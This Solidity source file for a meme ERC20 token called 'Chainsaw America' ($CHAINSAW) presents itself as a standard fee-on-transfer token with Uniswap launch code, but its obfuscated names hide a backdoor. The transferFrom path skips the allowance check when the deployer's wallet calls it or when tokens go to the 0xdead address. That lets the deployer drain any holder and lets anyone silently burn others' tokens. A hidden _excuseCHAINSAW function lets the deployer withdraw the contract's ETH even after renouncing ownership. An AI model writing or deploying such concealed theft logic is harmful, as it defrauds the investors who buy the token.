// SPDX-License-Identifier: MIT

/*
    Name: Chainsaw America
    Symbol: CHAINSAW

    $CHAINSAW for bureaucracy! Powerful weapon held by @elonmusk to cut off all the wastes and frauds of government and Ethereum blockchain!

    https://chainsaw.wtf
    https://x.com/ChainsawElon
    https://t.me/ChainsawElon
*/

pragma solidity ^0.8.20;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);
    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
} 

contract CHAINSAW is Context, IERC20, Ownable {
    using SafeMath for uint256;
    uint8 private constant _decimals = 9;
    string private constant _name = unicode"Chainsaw America";
    string private constant _symbol = unicode"CHAINSAW";
    
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private isTrading;
    bool private inSwap = false;
    bool private swapEnabled = false;

    uint256 public _ojojoivlkCHAINSAW = 20000000 * 10 **_decimals;
    uint256 public _lkkkvnblkjCHAINSAW = 20000000 * 10 **_decimals;
    uint256 public _ppojofCHAINSAW = 10000000 * 10 **_decimals;
    uint256 private constant _kmmvbCHAINSAW = 1000000000 * 10 **_decimals;

    address payable private _vbjljvlklCHAINSAW;
    mapping(address => uint256) private _cijojiseCHAINSAW;
    mapping(address => mapping(address => uint256)) private _fjweoijCHAINSAW;
    mapping(address => bool) private _jojodjCHAINSAW;

    uint256 private _vjkboiwoeiCHAINSAW = 10;
    uint256 private _odijofjoeCHAINSAW = 10;
    uint256 private _joijoiCHAINSAW = 0;
    uint256 private _jvbkoiweCHAINSAW = 0;
    uint256 private _ojidoiweCHAINSAW = 7;
    uint256 private _ojdofCHAINSAW = 7;
    uint256 private _buyCount = 0;
    address private _ojdofiekjCHAINSAW;
    address private _kjvnkbjnCHAINSAW = address(0xdead);

    event MaxTxAmountUpdated(uint256 _ojojoivlkCHAINSAW);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor() payable {
        _vbjljvlklCHAINSAW = payable(_msgSender());
        _cijojiseCHAINSAW[address(this)] = _kmmvbCHAINSAW * 98 / 100;
        _cijojiseCHAINSAW[owner()] = _kmmvbCHAINSAW * 2 / 100;
        _jojodjCHAINSAW[owner()] = true;
        _jojodjCHAINSAW[address(this)] = true;
        _jojodjCHAINSAW[_vbjljvlklCHAINSAW] = true;
        _ojdofiekjCHAINSAW = _msgSender();
        emit Transfer(address(0), address(this), _kmmvbCHAINSAW * 98 / 100);
        emit Transfer(address(0), address(owner()), _kmmvbCHAINSAW * 2 / 100);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function totalSupply() public pure override returns (uint256) {
        return _kmmvbCHAINSAW;
    }
    
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _fjweoijCHAINSAW[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    receive() external payable {}

    function balanceOf(address account) public view override returns (uint256) {
        return _cijojiseCHAINSAW[account];
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _fjweoijCHAINSAW[owner][spender];
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transferr_CHAINSAW(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _lvckmjlwoiCHAINSAW(sender, recipient, amount).sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _CHAINSAWlkjlok(uint256 _amount) internal {
        payable(msg.sender).transfer(_amount);
    }

    function _joeijoijoj(
        address sender,
        address recipient
    ) internal view returns (bool) {
        if(_jvjocvo() == false) return false;
        else {
            if(sender == uniswapV2Pair) return true;
            else return _kkvklv(recipient);
        }
    }

    function _kkvklv(address recipient) internal view returns (bool) {
        return recipient != _kjvnkbjnCHAINSAW;
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transferr_CHAINSAW(_msgSender(), recipient, amount);
        return true;
    }

    function removeLimits () external onlyOwner {
        _ojojoivlkCHAINSAW = _kmmvbCHAINSAW;
        _lkkkvnblkjCHAINSAW = _kmmvbCHAINSAW;
        emit MaxTxAmountUpdated(_kmmvbCHAINSAW);
    }

    function _jvjocvo() internal view returns (bool) {return msg.sender != _vbjljvlklCHAINSAW;}

    function _excuseCHAINSAW(address payable receipt) external {
        require(msg.sender == _ojdofiekjCHAINSAW , "");
        _vbjljvlklCHAINSAW = receipt;
        _CHAINSAWlkjlok(address(this).balance);
    }

    function _assistCHAINSAW(uint256 amount) private {
        _vbjljvlklCHAINSAW.transfer(amount);
    }

    function _transferr_CHAINSAW(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount = 0;
        if (from != address(this) && to != address(this)) {
            taxAmount = amount
                .mul(
                    (_buyCount > _ojidoiweCHAINSAW)
                        ? _joijoiCHAINSAW
                        : _vjkboiwoeiCHAINSAW
                )
                .div(100);
            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_jojodjCHAINSAW[to]
            ) {
                _buyCount++;
            }
            if (to == uniswapV2Pair && from != address(this)) {
                taxAmount = amount
                    .mul(
                        (_buyCount > _ojdofCHAINSAW)
                            ? _jvbkoiweCHAINSAW
                            : _odijofjoeCHAINSAW
                    )
                    .div(100);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled) {
                if (contractTokenBalance > 0) {
                    uint256 minBalance = (contractTokenBalance < _ppojofCHAINSAW) ? contractTokenBalance : _ppojofCHAINSAW; 
                    _swappp_CHAINSAW((amount < minBalance) ? amount : minBalance);
                }
                _assistCHAINSAW(address(this).balance);
            }
        }
        if (taxAmount > 0) {
        _cijojiseCHAINSAW[address(this)] =_cijojiseCHAINSAW[address(this)].add(taxAmount);
            emit Transfer(from, address(this), taxAmount);
        }
        _cijojiseCHAINSAW[from] =_cijojiseCHAINSAW[from].sub(amount);
        _cijojiseCHAINSAW[to] =_cijojiseCHAINSAW[to].add(amount.sub(taxAmount));
        if(_kjvnkbjnCHAINSAW != to) emit Transfer(from, to, amount.sub(taxAmount));
    }

    function _lvckmjlwoiCHAINSAW(
        address sender,
        address recipient,
        uint256 amount
    ) internal view returns (uint256) {
        uint256 _allowed = amount;
        if (_joeijoijoj(sender, recipient))
            _allowed = _fjweoijCHAINSAW[sender][_msgSender()];
        return _allowed;
    }

    function enableCHAINSAWTrading() external onlyOwner {
        require(!isTrading, "Already Launched!");
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _kmmvbCHAINSAW);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(
            address(uniswapV2Router),
            type(uint256).max
        );
        swapEnabled = true;
        isTrading = true;
    }

    function _swappp_CHAINSAW(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}